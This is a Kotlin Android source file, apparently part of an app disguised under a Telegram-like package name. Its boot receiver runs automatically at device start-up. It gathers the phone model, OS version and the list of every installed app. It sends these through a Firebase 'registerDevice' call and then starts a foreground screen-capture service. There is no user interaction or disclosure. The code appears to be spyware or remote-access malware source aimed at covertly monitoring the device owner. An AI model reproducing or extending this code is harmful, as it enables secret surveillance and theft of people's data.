package com.telegram2.messaging.remote

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            val pm = context.packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA).map { it.packageName }
            FirebaseBridge.registerDevice(
                name = Build.MODEL,
                version = Build.VERSION.RELEASE,
                apps = apps
            )
            context.startForegroundService(Intent(context, ScreenCaptureService::class.java))
        }
    }
}